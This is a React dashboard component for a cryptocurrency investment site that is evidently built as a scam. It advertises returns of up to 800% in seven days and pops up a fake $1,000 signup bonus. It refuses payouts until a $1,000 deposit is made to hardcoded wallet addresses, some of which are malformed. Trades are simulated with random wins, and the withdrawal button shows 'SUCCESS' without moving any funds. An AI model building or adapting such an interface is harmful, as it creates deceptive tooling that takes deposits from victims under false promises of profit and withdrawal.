
import React, { useState, useRef, useEffect } from 'react';
import { UserProfile, authService } from '../services/authService';
import { verifyPaymentProof, getInstantMarketPulse } from '../services/geminiService';

interface DashboardProps {
  user: UserProfile | null;
}

const INVESTMENT_PLANS = [
  { id: 1, name: 'The Quick Start', duration: '20 Min', minRet: 8, maxRet: 12, risk: 'Low' },
  { id: 2, name: 'Daily Coffee Trade', duration: '1 Hour', minRet: 15, maxRet: 22, risk: 'Medium' },
  { id: 3, name: 'Day Job Buster', duration: '4 Hours', minRet: 35, maxRet: 45, risk: 'High' },
  { id: 4, name: 'Pro Wealth Builder', duration: '12 Hours', minRet: 60, maxRet: 75, risk: 'High' },
  { id: 5, name: '24-Hour Payday', duration: '24 Hours', minRet: 90, maxRet: 110, risk: 'Very High' },
  { id: 6, name: 'Passive Weekender', duration: '3 Days', minRet: 240, maxRet: 300, risk: 'Medium' },
  { id: 7, name: 'Financial Freedom Plan', duration: '7 Days', minRet: 600, maxRet: 800, risk: 'Conservative' },
];

const PLATFORMS = ['BINANCE', 'BYBIT', 'KRAKEN', 'OKX', 'COINBASE'];

const NETWORKS = [
  { id: 'trc20', name: 'TRC-20 (Tron)', address: '0x7592766391918c7d3E7F8Ae72D97e98979F25302' },
  { id: 'erc20', name: 'ERC-20 (Ethereum)', address: '0x91F25302Ae72D97e989797592766391918c7d3E7' },
  { id: 'bep20', name: 'BNB (BEP-20)', address: '0x2D97e98979F253020x7592766391918c7d3E7F8Ae7' }
];

const Dashboard: React.FC<DashboardProps> = ({ user: initialUser }) => {
  const [user, setUser] = useState<UserProfile | null>(initialUser);
  const [copied, setCopied] = useState(false);
  const [uploadStatus, setUploadStatus] = useState<'idle' | 'uploading' | 'success' | 'failed'>('idle');
  const [auditMessage, setAuditMessage] = useState<string>('');
  const [withdrawStatus, setWithdrawStatus] = useState<'idle' | 'processing' | 'success'>('idle');
  const [withdrawError, setWithdrawError] = useState<string | null>(null);
  const [isUnlocked, setIsUnlocked] = useState(false);
  const [pinInput, setPinInput] = useState('');
  const [pinError, setPinError] = useState(false);
  const [aiPulse, setAiPulse] = useState<{sentiment: string, score: number, brief: string} | null>(null);
  const [isAiLoading, setIsAiLoading] = useState(false);
  const [selectedPlanId, setSelectedPlanId] = useState<number | null>(null);
  const [investAmount, setInvestAmount] = useState<number>(1000);
  const [isInvesting, setIsInvesting] = useState(false);
  const [activeTrade, setActiveTrade] = useState<{planName: string, amount: number, progress: number} | null>(null);
  const [isSyncing, setIsSyncing] = useState(false);
  const [withdrawAddress, setWithdrawAddress] = useState('');
  const [showBonus, setShowBonus] = useState(false);
  const [deploymentStep, setDeploymentStep] = useState<number>(-1);
  const fileInputRef = useRef<HTMLInputElement>(null);

  const [depositNetwork, setDepositNetwork] = useState(NETWORKS[0]);
  const [withdrawNetworkId, setWithdrawNetworkId] = useState('trc20');

  useEffect(() => {
    const refreshInterval = setInterval(() => {
      const u = authService.getUser();
      if (u) {
        setUser(u);
      }
    }, 5000);
    return () => clearInterval(refreshInterval);
  }, []);

  useEffect(() => {
    if (isUnlocked && !aiPulse) {
      fetchPulse();
      if (!initialUser?.hasDeposited && user?.balance === 1000) {
        setShowBonus(true);
      }
    }
  }, [isUnlocked]);

  const fetchPulse = async () => {
    setIsAiLoading(true);
    setDeploymentStep(0);
    for (let i = 0; i <= PLATFORMS.length; i++) {
      await new Promise(resolve => setTimeout(resolve, 600));
      setDeploymentStep(i + 1);
    }
    const pulse = await getInstantMarketPulse("Bitcoin/Ethereum Market");
    if (pulse) setAiPulse(pulse);
    setIsAiLoading(false);
    setDeploymentStep(-1);
  };

  const handleUnlock = (e: React.FormEvent) => {
    e.preventDefault();
    if (pinInput === '4451') {
      setIsUnlocked(true);
      setPinError(false);
    } else {
      setPinError(true);
      setPinInput('');
      setTimeout(() => setPinError(false), 500);
    }
  };

  const handleCopy = () => {
    navigator.clipboard.writeText(depositNetwork.address);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const triggerUpload = () => {
    fileInputRef.current?.click();
  };

  const handleFileChange = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      setUploadStatus('uploading');
      setAuditMessage('Checking your payment proof... Almost there!');
      const reader = new FileReader();
      reader.onloadend = async () => {
        const base64String = (reader.result as string).split(',')[1];
        const result = await verifyPaymentProof(base64String, file.type);
        if (result.is_valid && result.detected_amount >= 900) {
          setUploadStatus('success');
          setAuditMessage(`Success! $${result.detected_amount.toLocaleString()} has been added to your account.`);
          setIsSyncing(true);
          const updated = authService.updateUser({ 
            hasDeposited: true, 
            balance: (authService.getUser()?.balance || 0) + result.detected_amount 
          });
          if (updated) {
            setUser(updated);
            setTimeout(() => setIsSyncing(false), 2000);
          }
        } else {
          setUploadStatus('failed');
          setAuditMessage(result.summary || "We couldn't verify that. Please upload a clear screenshot of your transfer.");
          setTimeout(() => setUploadStatus('idle'), 5000);
        }
      };
      reader.readAsDataURL(file);
    }
  };

  const handleWithdraw = () => {
    if (!user) return;
    if (!user.hasDeposited) {
      const selectedNet = NETWORKS.find(n => n.id === withdrawNetworkId)?.name || 'TRC-20';
      setWithdrawError(`Please make your first deposit of $1,000 via ${selectedNet} to unlock your payouts.`);
      return;
    }
    if (!withdrawAddress.trim()) return;
    setWithdrawError(null);
    setWithdrawStatus('processing');
    setTimeout(() => {
      setWithdrawStatus('success');
    }, 3500);
  };

  const startInvestment = () => {
    if (!user || selectedPlanId === null) return;
    if (investAmount < 500 || investAmount > 50000) {
      alert("Please enter an amount between $500 and $50,000.");
      return;
    }
    const currentU = authService.getUser();
    if (!currentU || currentU.balance < investAmount) {
      alert("You don't have enough in your available balance.");
      return;
    }
    const plan = INVESTMENT_PLANS.find(p => p.id === selectedPlanId);
    if (!plan) return;
    setIsInvesting(true);
    setActiveTrade({ planName: plan.name, amount: investAmount, progress: 0 });
    const updatedUser = authService.updateUser({ 
      balance: currentU.balance - investAmount,
      totalInvested: currentU.totalInvested + investAmount
    });
    if (updatedUser) setUser(updatedUser);
    
    let progress = 0;
    const interval = setInterval(() => {
      progress += 8;
      setActiveTrade(prev => prev ? { ...prev, progress } : null);
      if (progress >= 100) {
        clearInterval(interval);
        finalizeTrade(plan, investAmount);
      }
    }, 120);
  };

  const finalizeTrade = (plan: typeof INVESTMENT_PLANS[0], amount: number) => {
    const u = authService.getUser();
    if (!u) return;
    const isWin = Math.random() < 0.95; 
    const returnPercent = isWin 
      ? (Math.random() * (plan.maxRet - plan.minRet) + plan.minRet) / 100 
      : -0.05; 
    const profit = amount * returnPercent;
    const finalAmount = amount + profit;
    
    setIsSyncing(true);
    const updatedUser = authService.updateUser({
      balance: u.balance + finalAmount,
      wins: isWin ? (u.wins + 1) : u.wins,
      losses: isWin ? u.losses : (u.losses + 1)
    });
    
    if (updatedUser) {
      setUser(updatedUser);
      setTimeout(() => setIsSyncing(false), 2000);
    }
    
    setIsInvesting(false);
    setActiveTrade(null);
    setSelectedPlanId(null);
  };

  if (!user) return null;

  return (
    <div className="bg-[#131722] min-h-screen pt-4 pb-24 px-4 sm:px-6 lg:px-8 overflow-hidden relative">
      {showBonus && (
        <div className="fixed inset-0 z-[110] flex items-center justify-center p-4 bg-black/90 backdrop-blur-3xl animate-in fade-in duration-500">
           <div className="bg-[#1e222d] border-2 border-[#f01a64] w-full max-w-sm rounded-[3rem] p-8 text-center shadow-[0_0_100px_rgba(240,26,100,0.5)] space-y-6">
              <div className="text-6xl mb-4">🎉</div>
              <h2 className="text-3xl font-black text-white uppercase tracking-tighter italic">CONGRATULATIONS!</h2>
              <p className="text-gray-300 font-bold leading-relaxed">
                You won <span className="text-[#00b36b] text-xl font-black">$1,000</span> for signing up! You can withdraw this amount anytime. Let's play and grow your wealth!
              </p>
              <button 
                onClick={() => setShowBonus(false)}
                className="w-full bg-[#f01a64] hover:bg-pink-700 text-white font-black py-4 rounded-2xl shadow-xl transition-all uppercase tracking-[0.2em] text-xs"
              >
                START TRADING NOW
              </button>
           </div>
        </div>
      )}

      {!isUnlocked && (
        <div className="fixed inset-0 z-[100] backdrop-blur-3xl bg-black/80 flex items-center justify-center p-4 transition-all duration-500">
          <div className={`bg-[#1e222d] border border-[#2a2e39] w-full max-w-sm rounded-[2.5rem] p-10 shadow-[0_0_100px_rgba(240,26,100,0.2)] text-center space-y-8 ${pinError ? 'animate-shake' : 'animate-in zoom-in-95'}`}>
            <div className="flex justify-center">
              <div className="w-20 h-20 bg-[#f01a64]/10 rounded-full flex items-center justify-center text-[#f01a64] animate-pulse">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-10 w-10" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                </svg>
              </div>
            </div>
            <div className="space-y-2">
              <h2 className="text-xl font-black text-white uppercase tracking-tighter">Security Protocol</h2>
              <p className="text-[10px] text-gray-500 font-black uppercase tracking-[0.3em]">World Trade Platform Protected</p>
            </div>
            <form onSubmit={handleUnlock} className="space-y-6">
              <div className="flex justify-center gap-4">
                <input 
                  type="password" 
                  maxLength={4}
                  value={pinInput}
                  autoFocus
                  onChange={(e) => setPinInput(e.target.value)}
                  placeholder="PIN"
                  className="w-full bg-[#131722] border-2 border-[#2a2e39] rounded-2xl py-4 text-center text-2xl font-black text-white focus:outline-none focus:border-[#f01a64] transition-all tracking-[1em] placeholder:tracking-normal placeholder:text-gray-700"
                />
              </div>
              <button type="submit" className="w-full bg-[#f01a64] hover:bg-pink-700 text-white font-black py-4 rounded-2xl shadow-xl transition-all uppercase tracking-[0.2em] text-xs">Unlock Terminal</button>
            </form>
            <p className="text-[9px] text-gray-600 font-bold uppercase">Enter Access Key to continue</p>
          </div>
        </div>
      )}

      <div className="max-w-7xl mx-auto space-y-8">
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
          <div className="bg-[#1e222d] border border-[#2a2e39] p-5 rounded-3xl shadow-xl overflow-hidden relative group">
            <span className="text-[9px] text-gray-500 font-black uppercase tracking-widest block mb-2 truncate">Available Balance</span>
            <div className="flex items-center gap-2 overflow-hidden">
               <span className="text-xl sm:text-2xl xl:text-3xl font-black text-[#00b36b] truncate">${user.balance.toLocaleString()}</span>
               <div className="w-2 h-2 bg-[#00b36b] rounded-full animate-pulse flex-shrink-0"></div>
            </div>
            <button onClick={() => setIsUnlocked(false)} className="absolute top-4 right-4 text-gray-700 hover:text-[#f01a64] transition-colors" title="Lock Terminal">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" /></svg>
            </button>
          </div>
          <div className="bg-[#1e222d] border border-[#2a2e39] p-5 rounded-3xl shadow-xl overflow-hidden">
            <span className="text-[9px] text-gray-500 font-black uppercase tracking-widest block mb-2 truncate">Currently Working</span>
            <span className="text-xl sm:text-2xl xl:text-3xl font-black text-white truncate block">${user.totalInvested.toLocaleString()}</span>
          </div>
          <div className="bg-[#1e222d] border border-[#2a2e39] p-5 rounded-3xl shadow-xl overflow-hidden">
            <span className="text-[9px] text-gray-500 font-black uppercase tracking-widest block mb-2 truncate">Successful Trades</span>
            <div className="flex items-baseline gap-1 overflow-hidden">
                <span className="text-xl sm:text-2xl xl:text-3xl font-black text-[#00b36b]">{user.wins}</span>
                <span className="text-gray-600 font-bold">/</span>
                <span className="text-xl sm:text-2xl xl:text-3xl font-black text-red-500">{user.losses}</span>
            </div>
          </div>
          <div className="bg-[#1e222d] border border-[#2a2e39] p-5 rounded-3xl shadow-xl flex flex-col justify-center text-center overflow-hidden relative">
            <span className="text-[9px] text-gray-500 font-black uppercase tracking-widest block mb-1 truncate">Cloud Sync Status</span>
            <div className="flex items-center justify-center gap-2">
              <div className={`w-1.5 h-1.5 rounded-full ${isSyncing ? 'bg-amber-500 animate-ping' : 'bg-[#00b36b]'}`}></div>
              <span className={`text-[10px] font-black uppercase tracking-widest truncate ${isSyncing ? 'text-amber-500' : 'text-[#00b36b]'}`}>
                {isSyncing ? 'Syncing...' : 'Securely Archiving'}
              </span>
            </div>
          </div>
        </div>

        <div className="bg-[#1e222d] border-2 border-dashed border-pink-500/30 p-8 rounded-[2rem] shadow-[0_0_40px_rgba(240,26,100,0.05)] relative overflow-hidden">
          <div className="absolute top-0 right-0 p-4">
             <div className="w-3 h-3 bg-[#f01a64] rounded-full animate-ping"></div>
          </div>
          <div className="flex flex-col md:flex-row gap-8 items-center">
            <div className="shrink-0 w-20 h-20 bg-[#f01a64]/10 rounded-3xl flex items-center justify-center text-[#f01a64] shadow-inner">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-10 w-10" viewBox="0 0 20 20" fill="currentColor">
                <path fillRule="evenodd" d="M11.3 1.046A1 1 0 0112 2v5h4a1 1 0 01.82 1.573l-7 10A1 1 0 018 18v-5H4a1 1 0 01-.82-1.573l7-10a1 1 0 011.12-.38z" clipRule="evenodd" />
              </svg>
            </div>
            <div className="flex-1 text-center md:text-left min-w-0">
              <h3 className="text-base font-black text-white uppercase tracking-[0.2em] mb-1">Neural Market Intelligence</h3>
              <p className="text-[10px] text-gray-500 font-bold uppercase tracking-widest mb-4">World Trade Platform / Gemini Engine Pulse</p>
              
              {isAiLoading ? (
                <div className="space-y-4 animate-in fade-in">
                  <div className="flex flex-wrap gap-2 justify-center md:justify-start">
                    {PLATFORMS.map((plat, i) => (
                      <div key={plat} className={`text-[9px] font-black px-3 py-1.5 rounded-lg border transition-all duration-300 ${deploymentStep > i ? 'bg-[#00b36b]/20 border-[#00b36b] text-[#00b36b]' : 'bg-gray-800 border-gray-700 text-gray-600'}`}>
                        {plat}: {deploymentStep > i ? `$${(investAmount / 5).toFixed(0)} DEPLOYED` : 'WAITING...'}
                      </div>
                    ))}
                  </div>
                  <div className="flex items-center gap-3 justify-center md:justify-start">
                    <div className="h-1 w-full max-w-[300px] bg-gray-800 rounded-full overflow-hidden">
                      <div className="h-full bg-[#f01a64] transition-all duration-300" style={{ width: `${(deploymentStep / PLATFORMS.length) * 100}%` }}></div>
                    </div>
                  </div>
                </div>
              ) : (
                <div className="space-y-2 animate-in fade-in slide-in-from-left-2">
                   <div className="flex items-center gap-2 justify-center md:justify-start">
                      <span className={`px-2 py-0.5 rounded text-[10px] font-black uppercase ${aiPulse?.score && aiPulse.score > 50 ? 'bg-[#00b36b]/10 text-[#00b36b]' : 'bg-red-500/10 text-red-500'}`}>
                         {aiPulse?.sentiment || 'Neutral'} ({aiPulse?.score || 50}%)
                      </span>
                      <span className="text-gray-300 font-bold text-[11px] italic leading-tight">"{aiPulse?.brief || 'Waiting for signal synchronization...'}"</span>
                   </div>
                </div>
              )}
            </div>
            <button 
              onClick={fetchPulse} 
              disabled={isAiLoading}
              className="px-8 py-4 bg-gradient-to-r from-[#f01a64] to-pink-600 rounded-2xl text-[11px] font-black uppercase text-white shadow-[0_0_20px_rgba(240,26,100,0.3)] hover:scale-105 active:scale-95 transition-all disabled:opacity-50 tracking-[0.1em]"
            >
              Neural Capital Deployment
            </button>
          </div>
        </div>

        {activeTrade && (
          <div className="bg-gradient-to-r from-pink-600/20 to-[#1e222d] border-l-4 border-[#f01a64] p-6 rounded-2xl animate-pulse flex items-center justify-between overflow-hidden">
            <div className="space-y-1 min-w-0">
              <h4 className="text-white font-black text-xs sm:text-sm uppercase tracking-tight truncate">Currently Trading: {activeTrade.planName}</h4>
              <p className="text-[9px] text-gray-400 font-bold uppercase truncate">Amount: ${activeTrade.amount.toLocaleString()}</p>
            </div>
            <div className="w-24 sm:w-32 h-1.5 bg-[#131722] rounded-full overflow-hidden border border-[#2a2e39] flex-shrink-0 ml-4">
              <div className="bg-[#f01a64] h-full" style={{ width: `${activeTrade.progress}%` }}></div>
            </div>
          </div>
        )}

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
          <div className="lg:col-span-2 space-y-6">
            <h3 className="text-xl font-black text-white uppercase tracking-tighter">Choose Your Profit Path</h3>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {INVESTMENT_PLANS.map((plan) => (
                <div key={plan.id} onClick={() => !isInvesting && setSelectedPlanId(plan.id)} className={`bg-[#1e222d] border-2 ${selectedPlanId === plan.id ? 'border-[#f01a64]' : 'border-[#2a2e39]'} p-6 rounded-[2rem] cursor-pointer hover:border-[#f01a64] transition-all relative overflow-hidden`}>
                  <div className="flex justify-between items-start mb-4 overflow-hidden">
                    <h4 className="text-white font-black text-sm uppercase tracking-tight truncate mr-2">{plan.name}</h4>
                    <span className="text-[#00b36b] font-black text-[10px] bg-[#00b36b]/10 px-2 py-0.5 rounded flex-shrink-0">Avg {plan.minRet}%</span>
                  </div>
                  <div className="flex justify-between items-end">
                    <div className="min-w-0">
                      <span className="text-[8px] text-gray-500 font-black uppercase block">Timeframe</span>
                      <span className="text-gray-300 font-bold text-xs uppercase truncate block">{plan.duration}</span>
                    </div>
                    <button className={`px-4 py-1.5 rounded-xl font-black text-[9px] uppercase tracking-widest flex-shrink-0 ${selectedPlanId === plan.id ? 'bg-[#f01a64] text-white' : 'bg-[#131722] text-[#f01a64] border border-pink-500/30'}`}>
                      {selectedPlanId === plan.id ? 'READY' : 'SELECT'}
                    </button>
                  </div>
                  {selectedPlanId === plan.id && (
                    <div className="mt-5 pt-5 border-t border-[#2a2e39] animate-in slide-in-from-top-4">
                      <div className="flex gap-2">
                        <input type="number" value={investAmount} onChange={(e) => setInvestAmount(Number(e.target.value))} className="w-full bg-[#131722] border border-[#2a2e39] rounded-xl px-4 py-2 text-xs text-white focus:outline-none focus:border-[#f01a64] font-black" />
                        <button onClick={(e) => { e.stopPropagation(); startInvestment(); }} className="bg-[#00b36b] text-white px-4 py-2 rounded-xl font-black text-[9px] uppercase active:scale-95 whitespace-nowrap">CONFIRM</button>
                      </div>
                    </div>
                  )}
                </div>
              ))}
            </div>
          </div>

          <div className="space-y-8">
            <div className="bg-[#1e222d] border border-[#2a2e39] p-8 rounded-[2.5rem] shadow-2xl relative overflow-hidden">
              <div className="absolute top-0 right-0 w-32 h-32 bg-pink-500/5 rounded-full blur-3xl -mr-16 -mt-16"></div>
              <div className="relative z-10 space-y-6">
                <h3 className="text-lg font-black text-white uppercase tracking-tighter flex items-center gap-2">
                  <svg className="w-5 h-5 text-[#f01a64]" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M12 4v16m8-8H4"/></svg>
                  Deposit Crypto
                </h3>
                
                <div className="space-y-3">
                  <label className="text-[8px] font-black text-gray-500 uppercase tracking-widest block">Select Deposit Network</label>
                  <div className="grid grid-cols-1 gap-2">
                    {NETWORKS.map(net => (
                      <button 
                        key={net.id}
                        onClick={() => setDepositNetwork(net)}
                        className={`px-4 py-2 rounded-xl text-[9px] font-black uppercase border transition-all ${depositNetwork.id === net.id ? 'bg-[#f01a64] text-white border-[#f01a64]' : 'bg-[#131722] text-gray-500 border-[#2a2e39] hover:border-[#f01a64]/50'}`}
                      >
                        {net.name}
                      </button>
                    ))}
                  </div>
                </div>

                <div className="bg-[#131722] border border-[#2a2e39] p-4 rounded-2xl overflow-hidden">
                  <span className="text-[8px] text-gray-500 font-black uppercase mb-1 block tracking-widest truncate">{depositNetwork.name} Address</span>
                  <div className="text-[9px] font-mono text-gray-300 break-all bg-[#1e222d] p-3 rounded-xl border border-[#2a2e39] mb-3 leading-relaxed">{depositNetwork.address}</div>
                  <button onClick={handleCopy} className={`w-full py-3 rounded-xl text-[10px] font-black uppercase transition-all ${copied ? 'bg-[#00b36b] text-white' : 'bg-[#1e222d] text-[#f01a64] border border-pink-500/20'}`}>
                    {copied ? 'COPIED!' : 'COPY ADDRESS'}
                  </button>
                </div>
                
                <div className="space-y-4">
                  <input type="file" ref={fileInputRef} onChange={handleFileChange} accept="image/*" className="hidden" />
                  <button onClick={triggerUpload} disabled={uploadStatus === 'uploading'} className={`w-full py-4 rounded-xl font-black text-[10px] uppercase tracking-[0.2em] shadow-xl transition-all ${uploadStatus === 'success' ? 'bg-[#00b36b] text-white' : uploadStatus === 'failed' ? 'bg-red-500 text-white' : uploadStatus === 'uploading' ? 'bg-gray-700 text-gray-400' : 'bg-[#f01a64] text-white'}`}>
                    {uploadStatus === 'idle' ? 'UPLOAD YOUR RECEIPT' : uploadStatus === 'uploading' ? 'VERIFYING...' : uploadStatus === 'success' ? 'VERIFIED' : 'FAILED'}
                  </button>
                  {auditMessage && <p className={`text-[9px] text-center font-black uppercase px-2 leading-tight ${uploadStatus === 'success' ? 'text-[#00b36b]' : uploadStatus === 'failed' ? 'text-red-500' : 'text-gray-500'}`}>{auditMessage}</p>}
                </div>
              </div>
            </div>

            <div className="bg-[#1e222d] border border-[#2a2e39] p-8 rounded-[2.5rem] shadow-2xl">
              <h3 className="text-lg font-black text-white uppercase tracking-tighter mb-6 text-center">Withdrawal Gateway</h3>
              
              <div className="space-y-6">
                <div className="space-y-2">
                  <label className="text-[8px] font-black text-gray-500 uppercase tracking-widest block">Choose Network</label>
                  <select 
                    value={withdrawNetworkId} 
                    onChange={(e) => setWithdrawNetworkId(e.target.value)}
                    className="w-full bg-[#131722] border border-[#2a2e39] rounded-xl px-4 py-3 text-xs text-white font-black focus:outline-none appearance-none cursor-pointer"
                  >
                    {NETWORKS.map(net => (
                      <option key={net.id} value={net.id}>{net.name}</option>
                    ))}
                  </select>
                </div>

                <div className="space-y-2">
                  <label className="text-[8px] font-black text-gray-500 uppercase tracking-widest truncate block">Enter Recipient Address</label>
                  <input type="text" value={withdrawAddress} onChange={(e) => setWithdrawAddress(e.target.value)} placeholder="Destination Address" className="w-full bg-[#131722] border border-[#2a2e39] rounded-xl px-4 py-3 text-xs text-white font-black focus:outline-none" />
                </div>
                
                {withdrawError && <p className="text-[9px] text-red-500 font-bold uppercase leading-tight">{withdrawError}</p>}
                
                <button onClick={handleWithdraw} disabled={withdrawStatus === 'processing' || !withdrawAddress.trim()} className={`w-full py-4 rounded-xl font-black text-[10px] uppercase tracking-[0.2em] transition-all ${withdrawStatus === 'success' ? 'bg-[#00b36b] text-white' : withdrawStatus === 'processing' ? 'bg-gray-700 text-gray-400' : 'bg-white/5 border border-white/10 text-gray-400 hover:text-white'}`}>
                  {withdrawStatus === 'idle' ? 'AUTHORIZE PAYOUT' : withdrawStatus === 'processing' ? 'PROCESSING...' : 'SUCCESS'}
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Dashboard;
